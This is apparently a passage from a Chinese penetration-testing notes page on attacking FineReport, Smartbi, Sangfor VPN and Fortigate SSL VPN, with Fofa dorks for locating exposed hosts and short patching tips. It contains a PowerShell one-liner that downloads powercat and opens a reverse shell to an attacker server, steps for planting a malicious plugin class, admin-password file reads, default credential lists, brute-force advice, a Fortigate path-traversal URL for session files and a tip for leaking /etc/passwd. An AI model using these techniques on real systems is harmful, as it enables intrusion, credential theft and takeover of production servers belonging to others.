<p>xray/finereport-directory-traversal.yml at master · chaitin/xray<br><a href="https://github.com/chaitin/xray/blob/master/pocs/finereport-directory-traversal.yml" target="_blank" rel="noopener">https://github.com/chaitin/xray/blob/master/pocs/finereport-directory-traversal.yml</a><br><strong>7. 利用技巧</strong></p>
<p>1.未设置密码或者读取读取管理员密码<br><a href="https://seeyoon.com/seeyonreport/ReportServer?op=fs_load&amp;cmd=fs_signin&amp;_=1560911828892" target="_blank" rel="noopener">https://seeyoon.com/seeyonreport/ReportServer?op=fs_load&amp;cmd=fs_signin&amp;_=1560911828892</a></p>
<p>这里很有可能是没有设置密码的, 修改密码进入后台就可以了</p>
<p>如果设置里密码, 尝试这个接口 <code>/report/ReportServer?op=chart&amp;cmd=get_geo_json&amp;resourcepath=privilege.xml</code>, 读取管理员密码, 然后使用上文的解密程序解密</p>
<p>2.后台getshell<br>这种后台能装插件的都随便getshell</p>
<p>先去下载一个指定版本的jar包</p>
<p>本地测试环境是9.0</p>
<p>下载com.fr.plugin.external-1.3.4.zip<br><a href="https://shop.finereport.com/plugin/2d36b210-2a59-4940-8c4f-f3f16d58cd66" target="_blank" rel="noopener">https://shop.finereport.com/plugin/2d36b210-2a59-4940-8c4f-f3f16d58cd66</a></p>
<p><a href="http://shopps.finereport.com/com.fr.plugin.external-1.3.4.zip?e=1561433162&amp;token=GYG9vMioxqbEgx-5HoAMAelD0zGdUrXT4UZ3w-d1:N-PeIkhKkjCY7LHdqelnSvp_LmA=" target="_blank" rel="noopener">http://shopps.finereport.com/com.fr.plugin.external-1.3.4.zip?e=1561433162&amp;token=GYG9vMioxqbEgx-5HoAMAelD0zGdUrXT4UZ3w-d1:N-PeIkhKkjCY7LHdqelnSvp_LmA=</a></p>
<p>编译一个恶意的LocaleFinder.class打包进去</p>
<p>复制LocaleFinder.class到<br><code>\com.fr.plugin.external-1.3.4.zip\fr-plugin-external-1.3.4\fr-plugin-external-1.3.4.jar\com\fr\plugin\external\locale\</code></p>
<p>进入到插件管理界面, 上传符合规范的jar包插件即可<br>没生效就访问一下 <code>https://xxxx/seeyonreport/ReportServer?op=im</code></p>
<p>一般后台都是win, 可以直接使用powershell进行反弹shell</p>
<pre><code class="hljs reasonml">powershell <span class="hljs-constructor">IEX(New-Object System.Net.Webclient)</span>.<span class="hljs-constructor">DownloadString('<span class="hljs-params">https</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">raw</span>.<span class="hljs-params">githubusercontent</span>.<span class="hljs-params">com</span><span class="hljs-operator">/</span><span class="hljs-params">besimorhino</span><span class="hljs-operator">/</span><span class="hljs-params">powercat</span><span class="hljs-operator">/</span><span class="hljs-params">master</span><span class="hljs-operator">/</span><span class="hljs-params">powercat</span>.<span class="hljs-params">ps1</span>')</span>;powercat -c vps_ip -p <span class="hljs-number">6666</span> -e cmd</code></pre>

<p><strong>8. 防护方法</strong></p>
<p>1.及时更新补丁</p>
<p>2.使用waf拦截</p>
<h1 id="第二节"><a href="#第二节" class="headerlink" title="第二节"></a>第二节</h1><h2 id="Smartbi-前台SQL注入"><a href="#Smartbi-前台SQL注入" class="headerlink" title="Smartbi 前台SQL注入"></a>Smartbi 前台SQL注入</h2><p><strong>1. 漏洞简介</strong></p>
<p>Smartbi /vision/RMIServlet 接口存在SQL注入, 无需身份认证的攻击者可利用该漏洞查看数据库中的敏感信息或删除任意用户.</p>
<p><strong>2. 影响组件</strong><br>Smartbi</p>
<p><strong>3. 漏洞指纹</strong></p>
<pre><code class="hljs ebnf"><span class="hljs-attribute">SmartBi</span></code></pre>

<p><strong>4. Fofa Dork</strong></p>
<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Smartbi"</span></code></pre>

<p><strong>5. 漏洞分析</strong></p>
<p>Smartbi软件SQL注入漏洞安全修复通报（厂商已修复）<br><a href="https://mp.weixin.qq.com/s/iWTq4-74gz6nCd0G4blmTQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/iWTq4-74gz6nCd0G4blmTQ</a></p>
<p>漏洞文件<br><code>vision/userListManager.jsp</code></p>
<pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doDel</span>(<span class="hljs-params"></span>)</span>{
   <span class="hljs-keyword">var</span> ids = [];
   <span class="hljs-comment">// 全选</span>
   <span class="hljs-keyword">if</span>($(<span class="hljs-string">"#checkAll"</span>).checked){
      <span class="hljs-keyword">if</span>(curRows){
         curRows.forEach(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">val, index</span>)</span>{
            ids.push(val.id);
         });
      }
   }<span class="hljs-keyword">else</span>{
      <span class="hljs-keyword">if</span>(curRows){
         $(<span class="hljs-string">"[name='checkTr']"</span>).each(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>{
            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>.checked){
               ids.push(<span class="hljs-keyword">this</span>.id);
            }
         });
      }
   }
   <span class="hljs-keyword">if</span>(ids &amp;&amp; ids.length &gt; <span class="hljs-number">0</span>){
      <span class="hljs-keyword">if</span>(!canOpt()){
         alert(<span class="hljs-string">"&lt;%=StringUtil.getLanguageValue("</span>Youdonothavepermissiontodoso<span class="hljs-string">")%&gt;"</span>);
         <span class="hljs-keyword">return</span>;
      }
      <span class="hljs-keyword">var</span> msg = <span class="hljs-string">"&lt;%=StringUtil.getLanguageValue("</span>Suredelete?<span class="hljs-string">")%&gt;"</span>;
      <span class="hljs-keyword">var</span> flags = modalWindow.MB_YESNO | modalWindow.MB_ICONQUESTION;
      alert(msg, <span class="hljs-string">"&lt;%=StringUtil.getLanguageValue("</span>Removetips<span class="hljs-string">")%&gt;"</span>, flags, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">ret</span>) </span>{
         <span class="hljs-keyword">if</span> (ret == modalWindow.ID_YES) {
            <span class="hljs-keyword">var</span> ret = jsloader.resolve(<span class="hljs-string">"freequery.common.util"</span>).remoteInvokeEx2(<span class="hljs-string">"BIConfigService"</span>, <span class="hljs-string">"delUsers"</span>, [ids]);
            <span class="hljs-keyword">if</span>(ret &amp;&amp; ret.result == <span class="hljs-number">1</span>){
               alert(<span class="hljs-string">"&lt;%=StringUtil.getLanguageValue("</span>Deletedsuccessfully<span class="hljs-string">")%&gt;"</span>);
               refresh();
            }
         }
      }, <span class="hljs-keyword">this</span>);
   }<span class="hljs-keyword">else</span>{
      alert(<span class="hljs-string">"&lt;%=StringUtil.getLanguageValue("</span>Noselectedobjectyouwanttodelete<span class="hljs-string">")%&gt;"</span>);
   }
}
smartbi/WEB-INF/lib/smartbi-BIConfig.jar!<span class="hljs-regexp">/smartbi/</span>config/BIConfigService.class
public int delUsers(List&lt;<span class="hljs-built_in">String</span>&gt; ids) {
    boolean succ = <span class="hljs-literal">true</span>;
    <span class="hljs-built_in">String</span> idStr = <span class="hljs-string">""</span>;
    <span class="hljs-keyword">if</span> (ids != <span class="hljs-literal">null</span> &amp;&amp; ids.size() &gt; <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">for</span>(int i = <span class="hljs-number">0</span>; i &lt; ids.size(); ++i) {
            <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>) {
                idStr = <span class="hljs-string">"('"</span> + (<span class="hljs-built_in">String</span>)ids.get(i) + <span class="hljs-string">"'"</span>;
            } <span class="hljs-keyword">else</span> {
                idStr = idStr + <span class="hljs-string">", "</span> + <span class="hljs-string">"'"</span> + (<span class="hljs-built_in">String</span>)ids.get(i) + <span class="hljs-string">"'"</span>;
            }
        }

        idStr = idStr + <span class="hljs-string">")"</span>;
        Connection conn = <span class="hljs-literal">null</span>;
        PreparedStatement prep = <span class="hljs-literal">null</span>;
        <span class="hljs-built_in">Object</span> rs = <span class="hljs-literal">null</span>;

        <span class="hljs-keyword">try</span> {
            conn = DbUtil.getRepoConnection();
            conn.setAutoCommit(<span class="hljs-literal">false</span>);
            <span class="hljs-built_in">String</span> sqlUser = <span class="hljs-string">"delete from t_user where c_userid in "</span> + idStr;
            <span class="hljs-built_in">String</span> sqlUserAttr = <span class="hljs-string">"delete from t_userattr where c_userid in "</span> + idStr;
            <span class="hljs-built_in">String</span> sqlUserconfig = <span class="hljs-string">"delete from t_userconfig where c_userid in "</span> + idStr;
            <span class="hljs-built_in">String</span> sqlUserRole = <span class="hljs-string">"delete from t_user_role where c_userid in "</span> + idStr;
            <span class="hljs-built_in">String</span> sqlUserGroup = <span class="hljs-string">"delete from t_group_user where c_userid in "</span> + idStr;
            prep = conn.prepareStatement(sqlUser);
            prep.execute();
            prep = conn.prepareStatement(sqlUserAttr);
            prep.execute();
            prep = conn.prepareStatement(sqlUserconfig);
            prep.execute();
            prep = conn.prepareStatement(sqlUserRole);
            prep.execute();
            prep = conn.prepareStatement(sqlUserGroup);
            prep.execute();
            conn.commit();
        } <span class="hljs-keyword">catch</span> (Exception var17) {
            <span class="hljs-keyword">try</span> {
                succ = <span class="hljs-literal">false</span>;
                conn.rollback();
            } <span class="hljs-keyword">catch</span> (SQLException var16) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> SmartbiException(ConfigErrorCode.DELETE_FAILED, var17);
            }

            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> SmartbiException(ConfigErrorCode.DELETE_FAILED, var17);
        } <span class="hljs-keyword">finally</span> {
            DbUtil.closeDBObject((ResultSet)rs, prep, conn);
        }

        <span class="hljs-keyword">return</span> succ ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>;
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
    }
}</code></pre>

<p><strong>6. 漏洞利用</strong></p>
<p>这里是delete 注入, 不建议使用, 没看到有公开的利用信息, 就不写EXP了</p>
<p><strong>7. 利用技巧</strong></p>
<p>1.RMIServlet加解密代码</p>
<p>虽然利用不能写EXP, 这里写一个RMIServlet 的加解密代码</p>
<pre><code class="hljs cs">ENCODING_SCHEDULE = {
    <span class="hljs-string">"0"</span>: <span class="hljs-string">"7"</span>, <span class="hljs-string">"1"</span>: <span class="hljs-string">"1"</span>, <span class="hljs-string">"2"</span>: <span class="hljs-string">"u"</span>, <span class="hljs-string">"3"</span>: <span class="hljs-string">"N"</span>, <span class="hljs-string">"4"</span>: <span class="hljs-string">"K"</span>, <span class="hljs-string">"5"</span>: <span class="hljs-string">"J"</span>, <span class="hljs-string">"6"</span>: <span class="hljs-string">"M"</span>, <span class="hljs-string">"7"</span>: <span class="hljs-string">"9"</span>, <span class="hljs-string">"8"</span>: <span class="hljs-string">"'"</span>, <span class="hljs-string">"9"</span>: <span class="hljs-string">"m"</span>, <span class="hljs-string">"!"</span>: <span class="hljs-string">"P"</span>, 
    <span class="hljs-string">"%"</span>: <span class="hljs-string">"/"</span>, <span class="hljs-string">"'"</span>: <span class="hljs-string">"n"</span>, <span class="hljs-string">"("</span>: <span class="hljs-string">"A"</span>, <span class="hljs-string">")"</span>: <span class="hljs-string">"E"</span>, <span class="hljs-string">"*"</span>: <span class="hljs-string">"s"</span>, <span class="hljs-string">"+"</span>: <span class="hljs-string">"+"</span>, <span class="hljs-string">"-"</span>: <span class="hljs-string">"f"</span>, <span class="hljs-string">"."</span>: <span class="hljs-string">"q"</span>, <span class="hljs-string">"A"</span>: <span class="hljs-string">"O"</span>, <span class="hljs-string">"B"</span>: <span class="hljs-string">"V"</span>, <span class="hljs-string">"C"</span>: <span class="hljs-string">"t"</span>, 
    <span class="hljs-string">"D"</span>: <span class="hljs-string">"T"</span>, <span class="hljs-string">"E"</span>: <span class="hljs-string">"a"</span>, <span class="hljs-string">"F"</span>: <span class="hljs-string">"x"</span>, <span class="hljs-string">"G"</span>: <span class="hljs-string">"H"</span>, <span class="hljs-string">"H"</span>: <span class="hljs-string">"r"</span>, <span class="hljs-string">"I"</span>: <span class="hljs-string">"c"</span>, <span class="hljs-string">"J"</span>: <span class="hljs-string">"v"</span>, <span class="hljs-string">"K"</span>: <span class="hljs-string">"l"</span>, <span class="hljs-string">"L"</span>: <span class="hljs-string">"8"</span>, <span class="hljs-string">"M"</span>: <span class="hljs-string">"F"</span>, <span class="hljs-string">"N"</span>: <span class="hljs-string">"3"</span>, 
    <span class="hljs-string">"O"</span>: <span class="hljs-string">"o"</span>, <span class="hljs-string">"P"</span>: <span class="hljs-string">"L"</span>, <span class="hljs-string">"Q"</span>: <span class="hljs-string">"Y"</span>, <span class="hljs-string">"R"</span>: <span class="hljs-string">"j"</span>, <span class="hljs-string">"S"</span>: <span class="hljs-string">"W"</span>, <span class="hljs-string">"T"</span>: <span class="hljs-string">"*"</span>, <span class="hljs-string">"U"</span>: <span class="hljs-string">"z"</span>, <span class="hljs-string">"V"</span>: <span class="hljs-string">"Z"</span>, <span class="hljs-string">"W"</span>: <span class="hljs-string">"!"</span>, <span class="hljs-string">"X"</span>: <span class="hljs-string">"B"</span>, <span class="hljs-string">"Y"</span>: <span class="hljs-string">")"</span>, 
    <span class="hljs-string">"Z"</span>: <span class="hljs-string">"U"</span>, <span class="hljs-string">"a"</span>: <span class="hljs-string">"("</span>, <span class="hljs-string">"b"</span>: <span class="hljs-string">"~"</span>, <span class="hljs-string">"c"</span>: <span class="hljs-string">"i"</span>, <span class="hljs-string">"d"</span>: <span class="hljs-string">"h"</span>, <span class="hljs-string">"e"</span>: <span class="hljs-string">"p"</span>, <span class="hljs-string">"f"</span>: <span class="hljs-string">"_"</span>, <span class="hljs-string">"g"</span>: <span class="hljs-string">"-"</span>, <span class="hljs-string">"h"</span>: <span class="hljs-string">"I"</span>, <span class="hljs-string">"i"</span>: <span class="hljs-string">"R"</span>, <span class="hljs-string">"j"</span>: <span class="hljs-string">"."</span>, 
    <span class="hljs-string">"k"</span>: <span class="hljs-string">"G"</span>, <span class="hljs-string">"l"</span>: <span class="hljs-string">"S"</span>, <span class="hljs-string">"m"</span>: <span class="hljs-string">"d"</span>, <span class="hljs-string">"n"</span>: <span class="hljs-string">"6"</span>, <span class="hljs-string">"o"</span>: <span class="hljs-string">"w"</span>, <span class="hljs-string">"p"</span>: <span class="hljs-string">"5"</span>, <span class="hljs-string">"q"</span>: <span class="hljs-string">"0"</span>, <span class="hljs-string">"r"</span>: <span class="hljs-string">"4"</span>, <span class="hljs-string">"s"</span>: <span class="hljs-string">"D"</span>, <span class="hljs-string">"t"</span>: <span class="hljs-string">"k"</span>, <span class="hljs-string">"u"</span>: <span class="hljs-string">"Q"</span>, 
    <span class="hljs-string">"v"</span>: <span class="hljs-string">"g"</span>, <span class="hljs-string">"w"</span>: <span class="hljs-string">"b"</span>, <span class="hljs-string">"x"</span>: <span class="hljs-string">"C"</span>, <span class="hljs-string">"y"</span>: <span class="hljs-string">"2"</span>, <span class="hljs-string">"z"</span>: <span class="hljs-string">"X"</span>, <span class="hljs-string">"~"</span>: <span class="hljs-string">"e"</span>, <span class="hljs-string">"_"</span>: <span class="hljs-string">"y"</span>, 
}

DECODING_SCHEDULE = {
    <span class="hljs-string">"7"</span>: <span class="hljs-string">"0"</span>, <span class="hljs-string">"1"</span>: <span class="hljs-string">"1"</span>, <span class="hljs-string">"u"</span>: <span class="hljs-string">"2"</span>, <span class="hljs-string">"N"</span>: <span class="hljs-string">"3"</span>, <span class="hljs-string">"K"</span>: <span class="hljs-string">"4"</span>, <span class="hljs-string">"J"</span>: <span class="hljs-string">"5"</span>, <span class="hljs-string">"M"</span>: <span class="hljs-string">"6"</span>, <span class="hljs-string">"9"</span>: <span class="hljs-string">"7"</span>, <span class="hljs-string">"'"</span>: <span class="hljs-string">"8"</span>, <span class="hljs-string">"m"</span>: <span class="hljs-string">"9"</span>, <span class="hljs-string">"P"</span>: <span class="hljs-string">"!"</span>, 
    <span class="hljs-string">"/"</span>: <span class="hljs-string">"%"</span>, <span class="hljs-string">"n"</span>: <span class="hljs-string">"'"</span>, <span class="hljs-string">"A"</span>: <span class="hljs-string">"("</span>, <span class="hljs-string">"E"</span>: <span class="hljs-string">")"</span>, <span class="hljs-string">"s"</span>: <span class="hljs-string">"*"</span>, <span class="hljs-string">"+"</span>: <span class="hljs-string">"+"</span>, <span class="hljs-string">"f"</span>: <span class="hljs-string">"-"</span>, <span class="hljs-string">"q"</span>: <span class="hljs-string">"."</span>, <span class="hljs-string">"O"</span>: <span class="hljs-string">"A"</span>, <span class="hljs-string">"V"</span>: <span class="hljs-string">"B"</span>, <span class="hljs-string">"t"</span>: <span class="hljs-string">"C"</span>, 
    <span class="hljs-string">"T"</span>: <span class="hljs-string">"D"</span>, <span class="hljs-string">"a"</span>: <span class="hljs-string">"E"</span>, <span class="hljs-string">"x"</span>: <span class="hljs-string">"F"</span>, <span class="hljs-string">"H"</span>: <span class="hljs-string">"G"</span>, <span class="hljs-string">"r"</span>: <span class="hljs-string">"H"</span>, <span class="hljs-string">"c"</span>: <span class="hljs-string">"I"</span>, <span class="hljs-string">"v"</span>: <span class="hljs-string">"J"</span>, <span class="hljs-string">"l"</span>: <span class="hljs-string">"K"</span>, <span class="hljs-string">"8"</span>: <span class="hljs-string">"L"</span>, <span class="hljs-string">"F"</span>: <span class="hljs-string">"M"</span>, <span class="hljs-string">"3"</span>: <span class="hljs-string">"N"</span>, 
    <span class="hljs-string">"o"</span>: <span class="hljs-string">"O"</span>, <span class="hljs-string">"L"</span>: <span class="hljs-string">"P"</span>, <span class="hljs-string">"Y"</span>: <span class="hljs-string">"Q"</span>, <span class="hljs-string">"j"</span>: <span class="hljs-string">"R"</span>, <span class="hljs-string">"W"</span>: <span class="hljs-string">"S"</span>, <span class="hljs-string">"*"</span>: <span class="hljs-string">"T"</span>, <span class="hljs-string">"z"</span>: <span class="hljs-string">"U"</span>, <span class="hljs-string">"Z"</span>: <span class="hljs-string">"V"</span>, <span class="hljs-string">"!"</span>: <span class="hljs-string">"W"</span>, <span class="hljs-string">"B"</span>: <span class="hljs-string">"X"</span>, <span class="hljs-string">")"</span>: <span class="hljs-string">"Y"</span>, 
    <span class="hljs-string">"U"</span>: <span class="hljs-string">"Z"</span>, <span class="hljs-string">"("</span>: <span class="hljs-string">"a"</span>, <span class="hljs-string">"~"</span>: <span class="hljs-string">"b"</span>, <span class="hljs-string">"i"</span>: <span class="hljs-string">"c"</span>, <span class="hljs-string">"h"</span>: <span class="hljs-string">"d"</span>, <span class="hljs-string">"p"</span>: <span class="hljs-string">"e"</span>, <span class="hljs-string">"_"</span>: <span class="hljs-string">"f"</span>, <span class="hljs-string">"-"</span>: <span class="hljs-string">"g"</span>, <span class="hljs-string">"I"</span>: <span class="hljs-string">"h"</span>, <span class="hljs-string">"R"</span>: <span class="hljs-string">"i"</span>, <span class="hljs-string">"."</span>: <span class="hljs-string">"j"</span>, 
    <span class="hljs-string">"G"</span>: <span class="hljs-string">"k"</span>, <span class="hljs-string">"S"</span>: <span class="hljs-string">"l"</span>, <span class="hljs-string">"d"</span>: <span class="hljs-string">"m"</span>, <span class="hljs-string">"6"</span>: <span class="hljs-string">"n"</span>, <span class="hljs-string">"w"</span>: <span class="hljs-string">"o"</span>, <span class="hljs-string">"5"</span>: <span class="hljs-string">"p"</span>, <span class="hljs-string">"0"</span>: <span class="hljs-string">"q"</span>, <span class="hljs-string">"4"</span>: <span class="hljs-string">"r"</span>, <span class="hljs-string">"D"</span>: <span class="hljs-string">"s"</span>, <span class="hljs-string">"k"</span>: <span class="hljs-string">"t"</span>, <span class="hljs-string">"Q"</span>: <span class="hljs-string">"u"</span>, 
    <span class="hljs-string">"g"</span>: <span class="hljs-string">"v"</span>, <span class="hljs-string">"b"</span>: <span class="hljs-string">"w"</span>, <span class="hljs-string">"C"</span>: <span class="hljs-string">"x"</span>, <span class="hljs-string">"2"</span>: <span class="hljs-string">"y"</span>, <span class="hljs-string">"X"</span>: <span class="hljs-string">"z"</span>, <span class="hljs-string">"e"</span>: <span class="hljs-string">"~"</span>, <span class="hljs-string">"y"</span>: <span class="hljs-string">"_"</span>, 
}

<span class="hljs-meta">#此函数可以用来加密明文也可以解密服务器返回的密文</span>
<span class="hljs-function">def <span class="hljs-title">encode</span>(<span class="hljs-params">code</span>):</span>
<span class="hljs-function">    <span class="hljs-keyword">out</span></span> = <span class="hljs-string">""</span>
    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> code:
        <span class="hljs-keyword">out</span> = <span class="hljs-keyword">out</span> + ENCODING_SCHEDULE.<span class="hljs-keyword">get</span>(item, item)
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">out</span>

<span class="hljs-function">def <span class="hljs-title">decode</span>(<span class="hljs-params">code</span>):</span>
<span class="hljs-function">    <span class="hljs-keyword">out</span></span> = <span class="hljs-string">""</span>
    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> code:
        <span class="hljs-keyword">out</span> = <span class="hljs-keyword">out</span> + DECODING_SCHEDULE.<span class="hljs-keyword">get</span>(item, item)
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">out</span></code></pre>

<p>2.该系统还有几处漏洞, 比如默认口令</p>
<pre><code class="hljs nsis">demo/demo

manager/demo

<span class="hljs-literal">admin</span>/<span class="hljs-literal">admin</span>

<span class="hljs-literal">admin</span>/manager

<span class="hljs-literal">admin</span>/<span class="hljs-number">2</span>manager</code></pre>

<p>3.默认路径</p>
<pre><code class="hljs ruby"><span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/127.0.0.1:18080/smartbi</span><span class="hljs-regexp">/vision/config</span>.jsp<span class="hljs-string">` 可能未修改密码或者密码为`</span>manager</code></pre>

<p>4.进入后台目录遍历</p>
<pre><code class="hljs xquery">http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">18080</span>/smartbi/vision/chooser.jsp<span class="hljs-built_in">?key</span>=CONFIG_FILE_DIR<span class="hljs-built_in">&amp;root</span>=C<span class="hljs-meta">%3A</span><span class="hljs-meta">%2F</span></code></pre>

<p>同样是后台可以加载插件, 怎么getshell不用我多说了吧</p>
<p><strong>8. 防护方法</strong></p>
<p>1.及时更新补丁</p>
<p>2.使用强口令</p>
<p>3.版本最好为最新版8.5以上, v7还有其他漏洞</p>
<h2 id="深信服VPN远程代码执行"><a href="#深信服VPN远程代码执行" class="headerlink" title="深信服VPN远程代码执行"></a>深信服VPN远程代码执行</h2><p><strong>1. 漏洞简介</strong></p>
<p>深信服 VPN 某个特定产品存在远程代码执行, 2019 攻防演练使用过</p>
<p><strong>2. 影响组件</strong><br>深信服 VPN</p>
<p><strong>3. 漏洞指纹</strong></p>
<pre><code class="hljs delphi"><span class="hljs-keyword">Set</span>-Cookie: TWFID=
welcome <span class="hljs-keyword">to</span> ssl vpn
Sinfor</code></pre>

<p><strong>4. Fofa Dork</strong></p>
<pre><code class="hljs ini"><span class="hljs-attr">header</span>=<span class="hljs-string">"Set-Cookie: TWFID="</span></code></pre>

<p><strong>5. 漏洞分析</strong></p>
<p>深信服vpnweb登录逆向学习 – potatso – 博客园<br><a href="https://www.cnblogs.com/potatsoSec/p/12326356.html" target="_blank" rel="noopener">https://www.cnblogs.com/potatsoSec/p/12326356.html</a></p>
<p><strong>6. 漏洞利用</strong></p>
<pre><code class="hljs cos">wget -t <span class="hljs-built_in">%d</span> -T <span class="hljs-built_in">%d</span> --spider <span class="hljs-built_in">%s</span>
分析一下上面文章就ok, 比较简单的命令注入</code></pre>

<p><strong>7. 利用技巧</strong></p>
<p>1.该版本深信服VPN属于相对早期的版本, 大概2008年左右, 但目前还有761个ip开放在公网</p>
<p>2.该版本较低, <code>whomai</code>不存在, 可以使用 <code>uname</code>, 这里没有空格可dns传出来</p>
<p>3.去除空格也简单 <code>cat /etc/passwd | tr " \n" "+|"</code></p>
<p><strong>8. 防护方法</strong></p>
<p>1.及时更新补丁</p>
<p>2.升级到最新版</p>
<h2 id="深信服-VPN-口令爆破"><a href="#深信服-VPN-口令爆破" class="headerlink" title="深信服 VPN 口令爆破"></a>深信服 VPN 口令爆破</h2><p><strong>1. 漏洞简介</strong></p>
<p>深信服 VPN 针对口令爆破是5次错误锁定IP五分钟, 所以这里爆破也不是不行, 主要是测试常见弱口令以及分布式爆破也不是不行</p>
<p><strong>2. 影响组件</strong><br>深信服 VPN</p>
<p><strong>3. 漏洞指纹</strong></p>
<pre><code class="hljs awk"><span class="hljs-regexp">/por/</span>login_auth.csp?apiversion=<span class="hljs-number">1</span>
sangfor
<span class="hljs-regexp">/cgi-bin/</span>login.cgi?rnd=</code></pre>

<p><strong>4. Fofa Dork</strong></p>
<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"深信服-SSL-VPN"</span></code></pre>

<p><strong>5. 漏洞分析</strong></p>
<p>关于SSL VPN认证时的验证码绕过 – SSL VPN/EMM – 深信服社区<br><a href="https://bbs.sangfor.com.cn/forum.php?mod=viewthread&amp;tid=20633" target="_blank" rel="noopener">https://bbs.sangfor.com.cn/forum.php?mod=viewthread&amp;tid=20633</a></p>
<p>此处存疑, 时间问题没有测试</p>
<p><strong>6. 漏洞利用</strong></p>
<p>1.深信服VPN 口令爆破 demo (这里仅测试了M6,其他的应该差不多)</p>
<pre><code class="hljs python"><span class="hljs-comment">#encoding=utf8</span>
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> hashlib
<span class="hljs-keyword">import</span> urllib3
urllib3.disable_warnings()
<span class="hljs-keyword">import</span> re
session = requests.session()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">SanForLogin</span><span class="hljs-params">(target, password, username=<span class="hljs-string">"admin"</span>)</span>:</span>
    <span class="hljs-comment"># 加密密码的算法是 sha1(password+sid)</span>
    <span class="hljs-comment"># 没有公开POC就不写了</span>


SanForLogin(<span class="hljs-string">"https://xxxxxxxxxxx/"</span>, <span class="hljs-string">"admin"</span>)</code></pre>

<p><strong>7. 利用技巧</strong></p>
<p>1.由于深信服涉及的版本跨度时间达十几年, 很多地方不一样, 但是总体都差不太多</p>
<p>国外APT组织应该也批量爆破了一波</p>
<p>加密的密码也就是 <code>sha1(password+sid)</code></p>
<p>爆破也就锁一会ip, 夜里丢一边跑着就完事了, 弱口令也就那么些</p>
<pre><code class="hljs angelscript">admin/<span class="hljs-number">123456</span>/Sangfor/<span class="hljs-symbol">Sangfor@</span><span class="hljs-number">123</span></code></pre>

<p>2.如果爆破出来了管理员密码, 管理员后台有好多处命令注入, 比如升级工具, 这里讲起来应该是正常功能</p>
<p>3.去年传闻还有前台sql注入, 但是没拿到补丁, 手头没环境, 就没分析, 看一下乌云上的老洞吧</p>
<p>深信服SSL VPN外置数据中心敏感信息泄漏&amp;SQL注入漏洞可导致getshell – 体验盒子 – 关注网络安全<br><a href="https://www.uedbox.com/post/31092/" target="_blank" rel="noopener">https://www.uedbox.com/post/31092/</a></p>
<p><strong>8. 防护方法</strong></p>
<p>1.及时更新补丁</p>
<p>2.升级到最新版</p>
<h2 id="Fortigate-SSL-VPN-文件读取-远程代码执行"><a href="#Fortigate-SSL-VPN-文件读取-远程代码执行" class="headerlink" title="Fortigate SSL VPN 文件读取/远程代码执行"></a>Fortigate SSL VPN 文件读取/远程代码执行</h2><p><strong>1. 漏洞简介</strong></p>
<p>Fortigate SSL VPN 在全球用户量巨大, 去年橘子哥发现了文件读取和远程代码执行漏洞</p>
<p><strong>2. 影响组件</strong><br>Fortigate SSL VPN</p>
<p><strong>3. 漏洞指纹</strong></p>
<pre><code class="hljs angelscript">Fortigate
<span class="hljs-number">4</span>tinet2095866</code></pre>

<p><strong>4. Fofa Dork</strong></p>
<pre><code class="hljs routeros"><span class="hljs-string">"Fortigate"</span> &amp;&amp; <span class="hljs-attribute">port</span>=10443</code></pre>

<p><strong>5. 漏洞分析</strong></p>
<p>Orange: Attacking SSL VPN – Part 2: Breaking the Fortigate SSL VPN<br><a href="https://blog.orange.tw/2019/08/attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn.html?m=1" target="_blank" rel="noopener">https://blog.orange.tw/2019/08/attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn.html?m=1</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>密码读取</p>
<p>milo2012/CVE-2018-13379: CVE-2018-13379<br><a href="https://github.com/milo2012/CVE-2018-13379" target="_blank" rel="noopener">https://github.com/milo2012/CVE-2018-13379</a></p>
<p>任意密码重置, 这肯定是个后门</p>
<p>milo2012/CVE-2018-13382: CVE-2018-13382<br><a href="https://github.com/milo2012/CVE-2018-13382" target="_blank" rel="noopener">https://github.com/milo2012/CVE-2018-13382</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.文件读取的路径构造</p>
<pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xxxxxx:<span class="hljs-number">10443</span><span class="hljs-regexp">/remote/</span>fgt_lang?lang=<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span>dev<span class="hljs-regexp">/cmdb/</span>sslvpn_websession</code></pre>

<p>如下padding可以构造出来任意文件读取, 可以读取其他文件, 注意这个系统好像没有/etc/passwd</p>
<pre><code class="hljs lisp">print(<span class="hljs-string">"/../../../../"</span>+(<span class="hljs-name">raw_input</span>().rjust(<span class="hljs-number">35</span>, '/')))</code></pre>

<p>2.寻找魔术数字</p>
<p>虽然当时橘子哥没有公开魔术数字, 但是当时随手分析了一下下面这个启动文件, 搜索一下magic就找到 4tinet2095866,</p>
